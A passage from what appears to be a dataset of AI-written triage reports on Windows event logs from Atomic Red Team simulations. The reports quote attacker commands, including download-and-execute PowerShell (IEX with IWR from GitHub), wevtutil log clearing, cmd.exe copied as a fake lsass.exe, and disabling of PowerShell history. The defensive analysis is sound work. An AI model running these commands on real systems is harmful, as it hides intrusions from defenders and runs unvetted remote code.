  - Increase monitoring on systems for similar activities including attempts to stop monitoring processes like Sysmon.
  - Educate and train users on secure practices and the potential indicators of compromise.
  - Review and potentially strengthen user access controls and permissions to prevent unauthorized activities.

Given the collected evidence and suspicious behavior observed, it is prudent to treat this case as a security breach and carry out further investigations to understand the scope and impact."
Service Registry Permissions Weakness,"### Detailed Analysis:

1. **Windows PowerShell Log**:
    - Multiple PowerShell events (EventID 600) show the execution of a script that queries Access Control Lists (ACLs) for registry paths related to system services. The PowerShell command shown is:
      ```
      powershell.exe & {get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\* |FL
      get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\weakservicename |FL}
      ```
    - Querying ACLs can be legitimate, but it could also be a reconnaissance step in a malicious campaign aimed at finding misconfigured services for potential exploitation.

2. **System Log**:
    - **EventID 104** indicates that event logs were cleared in both System and Windows PowerShell channels by user ""admin_test"". Clearing log files is a common tactic used by attackers to hide their tracks after an intrusion.
    - The associated client process for these actions is `wevtutil.exe`, which is legitimate for event log management but can be used maliciously if logs are cleared without a valid reason.

3. **Security Log**:
    - **EventID 1102** shows the Security log being cleared by the same user `admin_test`. The security log being cleared further complements an attempt to impede tracing malicious activities.

4. **Sysmon Logs**:
    - Series of events where processes like `wevtutil.exe` (Event ID 1) with the command line clearing logs for multiple channels (`Sysmon/Operational`, `Application`, `System`, and `Windows PowerShell`). 
    - The usage of `whoami.exe` and `HOSTNAME.EXE` could be indicative of scanning or reconnaissance to determine user context and system name on the compromised system.
    - Processes related to Microsoft Edge updates appear to be operating with SYSTEM privileges. While this could represent legitimate operations, it is noteworthy in the context of other suspicious activities.

5. **Application Log**:
    - Mostly benign Microsoft Edge update events, these events seem normal part of Edge's update process.

### Assessment:

- **Suspicious Activity**: The clearing of event logs and the execution of PowerShell scripts to enumerate registry permissions are activities that, when combined, suggest a potential malicious intent. These are typically common steps involved during and after compromise to hide tracks and gather information about system vulnerabilities.

- **Potential Threat/Risk**: There is a high risk of system compromise considering the clearing of logs to cover activities. The approach is consistent with techniques used in lateral movement or privilege escalation phases of attack lifecycle.

### Guidance on How to Proceed:
1. **Investigate User Activity**: Determine if the actions performed by `admin_test` are consistent with their role. Verify recent login activity and any unusual behavior associated with the user account.
2. **Check for Unauthorized Access**: Review recent accesses and changes to the system preceding the log clearance to identify unauthorized activity.
3. **Evaluate PowerShell Command**: Assess if the PowerShell command, especially relating to weak service configuration, corresponds to a legitimate need or unauthorized reconnaissance.
4. **Enhance Monitoring**: Increase audit and monitoring for administrative actions, particularly around logging services and PowerShell activity.
5. **Incident Response**: Given the combination of suspicious activities, a forensic analysis and incident response plan should be considered to thoroughly investigate the extent of potential compromise.

### Resolution:
- **SUSPICIOUS**: The logs show activities that are suspicious and warrant further investigation to confirm if they are legitimate or indications of a security breach."
Clear Event Logs via VBA,"Upon analyzing the provided logs, several indicators suggest potentially malicious activity, requiring detailed examination and a decisive response:

### Analysis:

1. **Security Log Analysis**:
   - **Event ID 1102**: The event indicates that the security log was cleared by the user `admin_test`. Log clearing can be an indicator of an attempt to cover up tracks after malicious activities have been performed.

2. **Sysmon Log Analysis**:
   - **Process Creation** (Event ID 1) of `wevtutil.exe`: Multiple instances of `wevtutil.exe` command-line utility were used to clear event logs (`cl` argument used). The logs indicate attempts to clear the System, Security, and Application logs. This is a known technique where attackers clear event logs to erase traces of their activities.
   - **Powershell Execution** (Event ID 1) with suspicious scripts: PowerShell was launched with a command-line that downloads and executes a script from a URL `https://raw.githubusercontent.com/redcanaryco/atomic-red-team/...`. The use of PowerShell with the `iwr` (Invoke-WebRequest) followed by `IEX` (Invoke-Expression) is a known method of executing scripts from remote locations, often utilized in attacks.
   - **Process Execution of Malicious Script**: Command-line execution of `Invoke-Maldoc` and particularly the `-sub ""ClearLogs""` implies an attempt to execute a malicious macro to clear logs, aligning with other log-clear activity seen in the `wevtutil.exe` events.

3. **System Log Analysis**:
   - **Event ID 104**: It confirms that both System and Windows PowerShell logs were cleared by `admin_test`. Clearing the logs is a strong indication of an attempted cover-up of malicious actions.
   
4. **Windows PowerShell Log**:
   - The log verifies the execution of a malicious script indicated in Sysmon logs, reinforcing the findings from the Sysmon analysis.

### Conclusion:

Considering the combined evidence from multiple logs indicating log tampering and malicious script execution, this behavior is a classic sign of malicious activity. The clearing of event logs and suspicious script execution suggest an attempt to hide unauthorized or malicious actions on the system.

### Resolution: **MALICIOUS**

### Guidance:

Immediate actions should be taken to contain, eradicate, and recover from the incident:
1. **Network Isolation**: Immediately isolate Server002 from the network to prevent further damage or lateral movement.
2. **Incident Response**: Initiate a full incident response investigation to understand the scope of the intrusion.
3. **Forensic Analysis**: Collect forensic images of the compromised system for further analysis.
4. **Credentials Review**: Review and reset passwords for accounts, particularly `admin_test`.
5. **Harden Security**: Implement stricter auditing and monitoring policies, and deploy tools to detect and prevent similar occurrences in the future.
6. **Patch & Update**: Ensure all systems are updated with the latest security patches and endpoint protection measures are in place.

This thorough approach will help secure the environment against reoccurrence and improve overall security posture."
Masquerading as Windows LSASS process,"Upon analyzing the provided Windows event logs, a number of suspicious activities were observed that warrant further investigation. Below is a detailed analysis:

1. **Event Log Clearing**:
    - **Event ID 1102 (Security Log)** and **Event ID 104 (System Log)**: These events indicate that the respective logs were cleared. This action was performed by the user ""admin_test"". Log clearing is highly suspicious as it can be an indication of an attempt to cover tracks after malicious activities.

2. **Unauthorized Use of Tools**:
    - **Sysmon Event ID 1**: This includes the use of `wevtutil.exe` to clear logs (""wevtutil.exe cl Microsoft-Windows-Sysmon/Operational""). As per the Sysmon logs, this action was completed without issuing a corresponding administrative command typically expected in normal operations.

3. **Unusual Command Execution**:
    - **Sysmon Event ID 1**: A specific command was executed which involves copying `cmd.exe` and renaming it to `lsass.exe`, followed by its execution (`cmd.exe /c copy %%SystemRoot%%\\System32\\cmd.exe %%SystemRoot%%\\Temp\\lsass.exe &amp; %%SystemRoot%%\\Temp\\lsass.exe /B`). This behavior is abnormal and resembles techniques used to obfuscate and execute potentially malicious code.

4. **Command Line Utilization**:
    - **Sysmon Event ID 1 (PowerShell Execution)**: Multiple instances of PowerShell scripts being executed with potentially malicious intentions, using restricted execution policy. PowerShell is a common tool used in attacks due to its scripting capabilities.

5. **Network Service Process Execution**:
    - **CompatTelRunner.exe (Telemetry Runner)**: Many instances show telemetry runner processes with unusual parent-child relationships to each other, which is not typical, as seen with CompatTelRunner being repeatedly executed in various contexts.

6. **Privilege and Logon Events**:
    - **Event ID 4672**: Special privileges such as `SeDebugPrivilege`, `SeImpersonatePrivilege`, and others have been enabled. These privileges can be used for privilege escalation and system manipulation.

Based on these observations, it is recommended to follow these steps:

- **Investigate User ""admin_test""**: Look into the activities of the user `admin_test` to determine if this access was legitimate or if the account has been compromised.
  
- **Review Processes and Services**: Investigate the execution of `cmd.exe`, `CompatTelRunner.exe`, and `PowerShell` scripts to validate if these were legitimate activities or part of malicious behavior.

- **Inspect Network Traffic**: Monitor network traffic from the host `Server002` to check for any unusual outbound connections which could indicate data exfiltration.

Given the findings and potential implications, the assessment concludes that the logs reflect actions typical of malicious activity. 

**Resolution**: MALICIOUS

It is crucial to perform a thorough investigation to determine the extent of the penetration and to mitigate any potential threats. Immediate endpoint isolation and forensics analysis are strongly advised to prevent further damage."
Set Custom AddToHistoryHandler to Avoid History File Logging,"### Detailed Analysis of Windows Event Logs:

**1. **Log Clearing:****
   - System log entries with Event ID 104 indicate that the logs have been cleared by the user `admin_test` for the System and Windows PowerShell channels. This is corroborated by the Security log entry with Event ID 1102, indicating a log clear event.
   - **Suspicious Nature:** Log clearing can be a tactic used by attackers to erase tracks and should raise instant suspicion unless there is a legitimate reason with documented proof.

**2. **Process Execution:****
   - `wevtutil.exe` execution is notable, as process logs indicate it's clearing event logs (""cl"" command-line argument indicates clear). Multiple instances of `wevtutil.exe` are seen clearing logs from Sysmon, Application, Windows PowerShell, and Security logs around the same period.
   - **Suspicious Nature:** While `wevtutil.exe` is a legitimate tool, its frequent usage for clearing logs is atypical outside of controlled IT operations. This, combined with it being executed by the `admin_test` user, suggests possible malicious activity.

**3. **PowerShell Activity:****
   - PowerShell execution with a command that disables history logging (`Set-PSReadLineOption -AddToHistoryHandler { return $false }`).
   - **Malicious Nature:** This command prevents PowerShell from logging command history, indicating an attempt to conceal activities. It strongly suggests compromise when combined with log clearing activities.

**4. **User Activity:****
   - Anomalous activities, including log clearing and PowerShell history obfuscation, are performed by the `admin_test` user.
   - **Contextual Evaluation:** If these activities aren't part of a scheduled maintenance or other documented activity, they're highly suspicious.

**5. **Edge Update Activities:****
   - Regular entries related to Microsoft Edge Update Processes are present.
   - **Benign Finding:** These appear consistent with normal system background updates for Microsoft Edge.

### **Assessment:**
The logs show repeated clearing of critical logs and use of PowerShell to hide activities—all indicators of an adversary's attempt to conceal their operations post-compromise. The user `admin_test` is central to these activities, suggesting either misuse of this account or malicious actions by the account's user.

### **Resolution: MALICIOUS**
- Based on the analysis, the logs indicate significant evidence of malicious activities with a focus on erasing traces through log clearing and suppressing PowerShell history logging. 

### **Guidance on How to Proceed:**
1. **Immediate Isolation:** Consider isolating the affected system to prevent lateral movement.
2. **User Account Review:** Review access logs for `admin_test`. Investigate logins, origin, and additional activities performed by this user.

4. **Log and Network Monitoring:** Enhance monitoring for any recursive log-clearing or history suppression activities across the network.
5. **Incident Response Engagement:** Engage incident response specialists to perform in-depth forensic analysis and confirm breach scope, methods, and origin.
6. **Review and Harden:** Post-incident, review and update security protocols, especially around log access and monitoring. Implement processes to reduce risks from similar future activities."
Disable Windows LogOff Button,"**Detailed Analysis**:

Upon reviewing the provided Windows event logs, several entries stand out that warrant attention and indicate potential suspicious activity:

1. **Event Log Clearing**:
   - There are multiple instances where event logs have been cleared, as evidenced by Security Event ID 1102 and multiple System Event ID 104 entries:
     - This activity is performed by the user ""admin_test"" on ""SERVER002"".
     - Clearing event logs can often be indicative of an attempt to cover tracks after a malicious activity has occurred.

2. **Suspicious Registry Modifications**:
   - A `cmd.exe` process (Event ID 17981) executed registry modifications using `reg.exe` (Event IDs 17983, 17985):
     - The command used in `cmd.exe` suggests changes to policies relating to explorer behaviors (`NoLogOff` and `StartMenuLogOff`).
     - Such modifications can be used to restrict logoff options, possibly to maintain session persistence.

3. **Excessive Use of `wevtutil.exe`**:
   - There are multiple entries involving the `wevtutil.exe` utility (Event IDs 17957, 17961, 17969, 17999):
     - Frequent command-line execution of `wevtutil.exe` to clear or export logs appears unusual.
     - The context and rapid succession imply potential log manipulation to erase or hide actions.

4. **High Integrity Level Operations**:
   - Several processes, including `cmd.exe` and `wevtutil.exe`, operate with ""High"" integrity levels, suggesting administrative privileges are being utilized.

5. **Parent Process and User Context**:
   - Many suspicious processes are initiated by `wsmprovhost.exe`, a legitimate WMI Provider Host service, under the ""admin_test"" user context. This could imply misuse of administrative scripts or sessions.

6. **Miscellaneous Observations**:
   - Frequent use of `conhost.exe` in conjunction with suspicious activities.
   - Large number of `Process Creation` (Sysmon Event ID 1) events tied to potentially stealthy or unnecessary command executions.

**Assessment of the Situation**:
- The combination of event log clearing, suspicious registry changes, and abnormal utilization of event utilities under a high privilege context strongly suggests an attempt to conduct or cover up illicit operations on the machine.

- The use of processes such as `cmd.exe` and `reg.exe` under administrative privileges adds to the risk profile, as these actions could support post-exploitation persistence techniques or privilege escalation attempts.

**Threats/Risks Identified**:
- Potential malicious alteration of system policies or configurations.
- Possible cover-up attempt via log manipulation.
- Improper or malicious use of administrative privileges by potentially unauthorized entities.

**Guidance on How to Proceed**:
1. Conduct a thorough investigation to identify the origin and intent behind these processes:
   - Examine the context and approvals for the high-privilege operations performed by ""admin_test"".
   - Validate if ""admin_test"" credentials were legitimately used or compromised.

2. Audit registry changes, especially around user policies, and revert unauthorized modifications.

3. Enhance monitoring for event log operations, alerting on unexpected usage patterns of `wevtutil.exe` and similar utilities.

4. Review and tighten access controls and privilege allocations to reduce misuse risk.

**Resolution**: **MALICIOUS**

The combination of event log manipulation, registry changes, and the use of administrative functions and commands suggests a high probability of malicious activity or compromise. Immediate remediation and a thorough forensic investigation are strongly recommended."
Extract binary files via VBA,"Based on the provided logs, there are several key points that warrant attention, which suggest a potential compromise:

1. **Log Clearing Activities:**
   - The System and Windows PowerShell logs indicate that logs were cleared using the `wevtutil.exe` utility. This action is executed by the user `SERVER002\admin_test`, which is a significant red flag as log-clearing is often used by attackers to cover their tracks.

2. **Suspicious PowerShell Command:**
   - A suspicious PowerShell script is executed, with parts of the command line involving downloading and executing a script from a GitHub repository associated with Red Canary's Atomic Red Team project. This project is typically used for simulating attacker techniques for testing defenses.
   - The command includes `Invoke-Maldoc`, which is indicative of malicious document testing, highly suspicious in a real-world scenario as it suggests execution of potentially harmful macros.

3. **Use of `wevtutil.exe`:**
   - There are multiple entries for `wevtutil.exe` being executed to clear logs from different channels (`System`, `Security`, `Windows PowerShell`). This indicates an intentional attempt to disrupt or remove event logs and is highly indicative of an attacker attempting to erase evidence of their activities.

4. **Potential Script Execution from a Known Adversary Simulation Framework:**
   - The presence of commands related to the Atomic Red Team framework suggests potential use of known adversarial simulation tools for malicious purposes, or potentially an unauthorized internal test that went awry or was not adequately communicated.

5. **Timing and Sequence:**
   - The activities of PowerShell execution, log clearing, and execution of administrative commands appear to occur in a very short timeframe, suggesting an orchestrated effort rather than normal administrative tasks.

**Assessment:**
Given the above points, the sequence of suspicious PowerShell execution, followed by clearing of logs — a common techniques to hide evidence of a compromise — and use of a penetration testing framework indicates KNOWN malicious behavior.

**Resolution: MALICIOUS**

**Guidance:**
- Immediately investigate the account `admin_test` to determine how and why these commands were executed.
- Check the integrity of the systems involved and look for any unauthorized changes or sensitive data access.
- Conduct a full network sweep to determine if similar activity is occurring elsewhere.
- Consider revoking the credentials and/or disabling accounts that are involved in executing these types of commands until further investigations are conducted.
- Ensure relevant logs across the enterprise are securely archived and access to logging systems is restricted to prevent further tampering.
- Notify the incident response team to initiate a comprehensive investigation to understand the scope and impact of this breach."
Bypass UAC using SilentCleanup task,"Upon reviewing the provided logs from the Sysmon, Security, System, and Application log sources, several observations and potential indicators of concern arise:

### Analysis:

1. **Sysmon Logs:**
   - Multiple instances of `wevtutil.exe` being executed with the ""cl"" (clear log) command targeting various logs such as ""Microsoft-Windows-Sysmon/Operational"", ""Application"", ""System"", ""Security"", and ""Windows PowerShell.""
   - These commands are being executed by a user with high integrity, specifically ""SERVER002\\admin_test"", suggesting elevated privileges.
   - `cmd.exe` execution with a batch script `AtomicRedTeam\T1548.002\src\T1548.002.bat` suggests usage of penetration testing or red team tactics.
   - The dominant parent process for these activities is `wsmprovhost.exe`, which indicates that these might be carried out via Windows Remote Management (WinRM).

2. **Security, System and Application Event Logs:**
   - Security log entry with EventID 1102 indicates the log was cleared. Clearing logs is often a cover-up activity to remove traces of unauthorized actions.
   - System log EventID 104 shows logs being cleared for the ""System"" and ""Windows PowerShell"" channels.
   - Application log entries related to `edgeupdate` may not directly correlate with the suspicious activities but their presence in the logs could suggest normal update operations.

3. **Indicators of Malicious Activity:**
   - Persistent usage of `wevtutil.exe` with the ""cl"" flag implies malicious activity attempting to cover tracks.
   - Execution of `cmd.exe` to run a script within a path indicative of a red team operation tool, specifically ""AtomicRedTeam,"" which simulates adversary techniques.
   - Usage of elevated privileges by ""SERVER002\\admin_test"" to execute these commands.

### Assessment:
The combination of cleared logs, execution of red team simulation scripts, and use of elevated privileges to clear event logs significantly flags this activity as suspicious and indicative of potential compromise. These are common tactics used in APTs to maintain persistence and evasion.

### Resolution:
**MALICIOUS** - The evidence from the logs strongly indicates an active attempt at obfuscation and a breach given the presence of specific red team activities and log clearance.

### Guidance:
1. **Immediate Actions:**
   - Isolate the machine (Server002) from the network to prevent further potential exfiltration or lateral movement.
   - Preserve a copy of the current logs for forensic analysis.
   - Conduct a comprehensive endpoint detection and response (EDR) sweep across the network for the same patterns or indicators.
   - Identify and review any changes made by the user ""SERVER002\\admin_test"".

2. **Further Investigation:**
   - Examine system integrity for signs of backdoors or rootkits.

Invoke HTML Application - Simulate Lateral Movement over UNC Path,"**Detailed Analysis of the Logs:**

1. **PowerShell Logs:**
   - Multiple PowerShell scripts appear to be executed with `Invoke-ATHHTMLApplication` and `MSHTAFilePath` interaction. This sequence can be indicative of malicious behavior:
     - **Key Observations:**
       - Usage of `mshta.exe` in conjunction with PowerShell can be indicative of malicious activity, as `mshta.exe` is a known tool used in fileless malware attacks.
       - The specific command `{Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath $env:windir\system32\mshta.exe}` appears repeatedly, which suggests potentially automated or scripted activity.

2. **System Logs:**
   - **Event Clearing:**
     - System logs and Windows PowerShell logs were cleared by the user ""admin_test"" (`EventID 104` indicates the logs were cleared). This is highly suspicious behavior as clearing logs can be an attempt to cover up malicious activity.
   
3. **Security Logs:**
   - **Security Log Cleared:**
     - Similar to system logs, security logs have been cleared, which is often a strong indication of malicious activity as it helps in hiding audit trails of attacks or unauthorized activities.

4. **Sysmon Logs:**
   - Several instances of process creation are observed:
     - **Notable Points:**
       - Execution of `wevtutil.exe` with the command line clearing (`cl`) event logs (Sysmon, Application, System, Security).
       - The user `admin_test` executed `C:\Windows\System32\wevtutil.exe` several times to clear different event logs, which is concerning as it aligns with attempts to hide tracks.
       - Usage of `C:\Windows\system32\whoami.exe` and `hostname.exe`, which are benign in isolation, but in the context of other activities, could suggest post-exploitation enumeration activities.

5. **Assessment:**
   - The combination of PowerShell misuse, event log clearing, and automated/scripted processes indicates a coordinated effort to execute potentially harmful commands and conceal the actions using log clearing tools.

**Resolution: MALICIOUS**

**Recommendation:**
- **Immediate Response Actions:**
  - Isolate the affected host (Server002) from the network to prevent further spread or data exfiltration.
  - Conduct a forensic investigation to understand the full scope of the breach, specifically focusing on root cause analysis, entry points, and data accessed or modified.
  - Change credentials associated with the affected user (`admin_test`) and consider wider domain account reviews, including an assessment of privilege levels and compromised accounts.
  
- **Preventive Measures:**
  - Implement monitoring and alerting for PowerShell usage on critical systems, emphasizing scripts containing potential Indicators of Compromise like `Invoke-ATHHTMLApplication`.
  - Regularly audit and review logs without delay to catch potentially malicious activities early.
  - Enforce principle of least privilege and consider implementing Just-In-Time (JIT) access to sensitive systems.
  - Educate staff on security awareness, particularly regarding handling suspicious activities like unusual PowerShell and use of known dual-use binaries (e.g., `mshta.exe`)."
Execution of HTA and VBS Files using Rundll32 and URL.dll,"Upon reviewing the provided event logs from the Windows host, several indicators suggest potential malicious activity. Here's a detailed analysis:

1. **Log Cleared Events:**
   - The security log indicates that the logs for the ""Security"" channel were cleared by the user `admin_test` (EventID: 1102). The use of `wevtutil.exe` to explicitly clear logs (`wevtutil cl Security`) is logged by Sysmon, which is suspicious as this is a known tactic employed by attackers to cover their tracks.
   - Similar clearing activities are seen for ""System"" and ""Windows PowerShell"" logs.

2. **Command and Script Execution:**
   - There are multiple instances of `cmd.exe` execution with suspicious command-line arguments that invoke `rundll32.exe` to run potentially malicious scripts (EventID: 1 in Sysmon). This involves reading an `.hta` file and a `.vbs` script from a temporary directory associated with `AtomicRedTeam`, a well-known security testing framework. The presence of these commands implies that someone might be running simulation tests or could indicate an unauthorized use of these frameworks to carry out malicious activities.

3. **Suspicious File Execution:**
   - The logs exhibit a pattern of normal system executables being used (like `HOSTNAME.EXE`, `whoami.exe`, `conhost.exe`) which are often leveraged by attackers to remain stealthy.
   - High-privileged scripts and commands are being executed by the `admin_test` account, which could either be part of legitimate testing or indicative of an elevated attack, especially when associated with log clearing actions previously mentioned.

4. **Time Manipulation:**
   - There are logged time change operations that were executed by the `LOCAL SERVICE` account. While this can sometimes be legitimate, in the context of other suspicious activities, it may suggest tampering designed to confuse temporal analysis.

**Assessment & Resolution:**
- Based on these findings, the logs indicate significant suspicious activities that could be potentially malicious. The clearing of event logs coupled with execution of potentially harmful scripts and unusual command-line executions points towards attempts at covering tracks and compromising the host.

**Recommended Actions:**
- **Further Investigation:** In-depth examination of the system should be conducted. Focus on tracing back activities associated with the `admin_test` user.
- **Containment and Mitigation:** Consider isolating the affected machine to prevent lateral movement within the network.
- **Incident Response:** If unauthorized activity is confirmed, proceed with a full incident response plan, including potentially engaging digital forensics to recover evidence and understand the extent of the compromise.

**Resolution:** **MALICIOUS** - The logs clearly contain activities consistent with known strategies used by malicious actors, especially log tampering and execution of suspicious scripts."
LOLBAS CustomShellHost to Spawn Process,"Upon reviewing the provided Windows event logs, the following indicators of potentially anomalous or malicious activity were identified:

1. **Log Clearance**: 
   - Repeated executions of `wevtutil.exe` to clear logs for multiple event channels (System, Windows PowerShell, Security) are observed in the logs. Log clearing activity, especially from sensitive log channels like Security, is a classic indication of a cover-up attempt by a malicious actor to disguise tracks.

2. **Abnormal PowerShell Command**:
   - There is a suspicious PowerShell command executed with a multitude of operations, such as creating a new directory, copying potentially suspicious system files like `customshellhost.exe` and `calc.exe` into that directory, and executing `customshellhost.exe`. This behavior is unusual and suggests an attempt to potentially set up a persistent backdoor or execute some unauthorized payload.

3. **Integrity Level**:
   - Several processes are executed with ""High"" integrity level under the `admin_test` user account. Though not inherently malicious, combined with other suspicious activities like log clearance and peculiar PowerShell execution, this needs further investigation.

4. **Security Log Clearance**:
   - Event ID 1102 indicates that the Security event log was cleared by the `admin_test` user. This is a rare operation and can indicate a deliberate attempt to erase logged evidence of unauthorized or malicious activities.

**Assessment**:
The combination of log file clearance activities and the execution of unusual PowerShell scripts aligns with tactics used by attackers to evade detection and persist within a compromised system environment. Given these activities, the behavior captured in the logs raises significant concerns of malicious activity.

**Resolution**:
Based on the evidence from the logs, the activity is classified as **MALICIOUS**. Immediate actions should be taken to:
- Isolate the affected host to prevent potential lateral movement.
- Perform a comprehensive forensic analysis on `Server002` to confirm the extent of the compromise.
- Review user account activities across the system for any unauthorized actions.
- Implement logging and monitoring improvements to capture detailed audit logs moving forward."
InfDefaultInstall.exe .inf Execution,"After a detailed analysis of the provided Windows event logs, several points of interest and potentially suspicious activities have been identified. Here is the breakdown of my analysis:

1. **Log Clearing Events**:
   - The logs indicate that both the Security (EventID: 1102) and System logs (EventID: 104) were cleared at the same time by the user `admin_test`. This is typically considered suspicious behavior as log clearing is often associated with attempts to hide unauthorized or malicious activity.

2. **Use of `wevtutil.exe`**:
   - There are multiple instances of the `wevtutil.exe` command line utility being run (as seen in Sysmon logs), specifically with the `cl` (clear) parameter targeting `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `Windows PowerShell` logs. This is consistent with attempts to hide traces of actions by clearing the event logs.

3. **Execution of Uncommon Commands**:
   - Processes such as `whoami.exe`, `hostname.exe`, and commands related to potential Windows Installer (INF Default Install using `InfDefaultInstall.exe`) are observed in the logs. These can be used for reconnaissance and script execution, indicating the possibility of lateral movement or privilege escalation attempts.

4. **PowerShell Execution**:
   - The presence of PowerShell processes (`powershell.exe`) without detailed command line arguments is worth noting. However, due to lack of specific command line details in the logs, it is difficult to determine if malicious activities were carried out via PowerShell.

5. **Activity Related to Edge Update**:
   - There are extensive logs around `MicrosoftEdgeUpdate.exe` and other related executables. While these may appear benign as part of browser updates, they can be abused or masqueraded by attackers to perform malicious activities. However, without further context or suspicious indicators related to these processes, they cannot be conclusively marked as malicious.

**Assessment**:

- **SUSPICIOUS**: The behaviors exhibited in these logs are highly suspicious. The act of clearing event logs is typically a red flag for malicious activity as it is intended to erase tracks that could be used for forensic investigations. Additionally, the extensive use of `wevtutil.exe` and the execution of possibly reconnaissance-related commands lend further credence to suspicion.

**Guidance**:

1. **Immediate Measures**:
   - Elevate the awareness of these activities immediately to the incident response team.
   - Remove or isolate the affected host to prevent further compromise or spread within the network.
   - Perform a thorough review of access permissions, especially for accounts like `admin_test`.

2. **Forensic Analysis**:
   - Collect additional forensic data or artifacts from the affected machine, such as memory dumps or disk images, for further investigation.
   - Correlate these logs with network and other relevant logs to identify potential sources or destinations involved in unauthorized activities.

3. **Long-term Recommendations**:
   - Implement alerting for events related to log clearing or execution of specific sensitive commands.
   - Encourage the practice of security hardening, such as the use of dedicated logging servers and ensuring logs cannot be tampered with easily.
   - Conduct regular audits and reviews of administrative account activities.

Conclusively, while the logs do not display direct evidence of a specific malware, the actions suggest an abnormal usage pattern, possibly indicative of unauthorized or malicious activities requiring further investigation."
Snake Malware Registry Blob,"Upon analyzing the provided Windows event logs, several observations can be made:

1. **Suspicious PowerShell Activity**:
    - The `Windows PowerShell` log shows a PowerShell script execution: `powershell.exe & {$typicalPath = ""HKLM:\SOFTWARE\Classes\.wav\OpenWithProgIds""; $randomBytes = New-Object Byte[] 0x1000; ...}`. This script creates a registry key named ""AtomicSnake"" with random binary data. Such registry modifications, especially in the context of generating random data and using PowerShell, are often indicative of obfuscation or preparation for a payload execution, potentially signaling malicious intent.

2. **Event Log Clearing**:
    - In the `Security`, `System`, and `Sysmon` logs, the `wevtutil.exe` command is used to clear event logs for channels `Security`, `Application`, `System`, and `Windows PowerShell`. This is a common tactic used by attackers to cover their tracks by deleting crucial logs that could indicate their presence or activities on a compromised system.

3. **Security Event 1102**: 
    - The `Security` log entry with EventID 1102 indicates the security log was cleared by user `admin_test`. Clearing of security logs by users other than authorized security personnel is often a red flag for malicious activities aimed at erasing traces.

4. **Use of System Utilities**:
    - There are multiple instances of legitimate Windows utilities such as `wevtutil.exe`, `whoami.exe`, and `HOSTNAME.EXE` being executed. While their use alone is not inherently malicious, in conjunction with log clearing actions and PowerShell scripts, it raises concern.

5. **Time Change Events**:
    - There are records of time changes with EventID 4616. While not unusual in itself, if found in conjunction with other suspicious activities, it can sometimes indicate time manipulation attempts by an attacker to affect timestamp-based event logging.

6. **Access Patterns and User Behaviors**:
    - The activities, including registry modification, log clearing, and PowerShell use, were executed under the user `admin_test`, with high integrity level, suggesting the actions have administrative privileges.

**Assessment**:
Based on the above observations, especially the suspicious PowerShell actions and the clearing of event logs, these events suggest malicious activity likely intended to prepare and obfuscate unauthorized operations on the system.

**Resolution**: MALICIOUS - The activities recorded in the logs are consistent with known malicious tactics and warrant immediate response actions.

**Guidance on how to proceed**:
- Investigate and isolate the affected system to prevent further unauthorized activities.
- Conduct a comprehensive forensic analysis to identify any additional indicators of compromise.
- Review and re-evaluate access permissions and security protocols to prevent unauthorized use of administrative accounts like `admin_test`.
- Ensure that PowerShell logging and system auditing are configured to detect similar suspicious behaviors in the future.
- Monitor for further attempts to clear or modify logs and strengthen log retention policies.
- Consider informing the Incident Response Team to further investigate the extent of the breach and remediate."
Regsvr32 Silent DLL Install Call DllRegisterServer,"### Detailed Analysis of Given Logs

#### Application Log

1. **Windows Defender State**:
   - The logs indicate that Windows Defender security product is in the ""ON"" state, which is a good indication of a protective measure being active and functional.

2. **Software Protection Platform Service**:
   - A log indicating an interaction with the Software Protection Platform Service, which typically manages licensing and activation services. 

Both entries appear normal for system operations and do not indicate malicious activity.

#### System Log

1. **Clearing of Event Logs**:
   - Two ""Event 104"" logs show that the ""admin_test"" user cleared both the ""System"" and ""Windows PowerShell"" event logs. Log clearing, especially by a user with admin privileges, can indicate an attempt to hide malicious activity or cleanup after such activity.

Clearing of event logs abruptly is typically considered suspicious, especially if it is not part of a regular or administratively authorized process.

#### Security Log

1. **Security Log Clearing**:
   - A ""Event 1102"" indicates that the ""Security"" log was cleared by the ""admin_test"" user. Like the system log clearing, this could imply attempts to cover tracks of potentially unauthorized activities.

Security log clearing by an administrator without prior justification or known administrative reason is highly suspicious behavior.

#### Sysmon Log

1. **Execution of wevtutil.exe**:
   - Multiple instances of `wevtutil.exe` were observed executing with commands to clear logs. This can correlate with log-clearing activities seen in system and security logs. 

2. **Unusual Command Execution**:
   - **cmd.exe Executing regsvr32.exe** with a suspicious DLL file, ""AllTheThingsx86.dll"". This log entry originates from the `AtomicRedTeam` path, which is known for penetration testing and emulating tactics used by adversaries. Usage of `regsvr32.exe` for DLL execution is a known technique for executing code under normal system binaries.

3. **Execution of PowerShell**:
   - There was a PowerShell execution logged, which, combined with log clearing, could imply attempts to execute commands in a less-detectable manner if more context was provided.

4. **Miscellaneous Tool Executions**:
   - Execution of `whoami.exe` and `hostname.exe` suggests potential reconnaissance activities, usually legitimate, but they can be suspicious in context with other identified activities.

### Assessment

From the analysis of the logs, several suspicious activities stand out:
- Multiple event log clearances by a single user, `admin_test`, indicating potential attempts to conceal activities.
- Execution of `cmd.exe` with `regsvr32.exe` and a suspicious DLL from the `AtomicRedTeam` path, suggesting potential malicious behavior in line with adversary simulation or penetration testing scenarios.
- Use of utilities like `wevtutil.exe` to clear logs, reinforcing the suspicious nature of the actions.

### Conclusion

The activities observed in the logs culminate in an overall assessment of **SUSPICIOUS**. There are indicators of behavior that are often associated with attempts to obfuscate tracks or simulate adversary techniques, such as log clearance and executing known dual-use binaries with potentially unwanted DLLs. While some activities might be benign under testing or administrative context, the combination and context require further investigation to determine the actual intent and scope of these actions.

### Guidance

- **Further Investigation**: Review the context surrounding `admin_test` activities. Verify if the operations correlate with authorized testing or scheduled maintenance.
- **Audit Configuration**: Improve audit policies to ensure better traceability of actions taken by privileged accounts.
- **Endpoint Monitoring**: Strengthen endpoint monitoring to detect use of known utilities in suspicious contexts.
- **User Verification**: Confirm whether the user `admin_test` was conducting legitimate or authorized activities.

The resolution suggests these activities require further exploration to rule out potential compromise or insider threats."
Add Root Certificate to CurrentUser Certificate Store,"### Detailed Analysis of the Logs

#### 1. **Windows PowerShell Log Review**:
- **Observed Activity**: There are multiple instances of PowerShell events where the command executed is attempting to download and execute a script from a GitHub repository using `IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing)`.
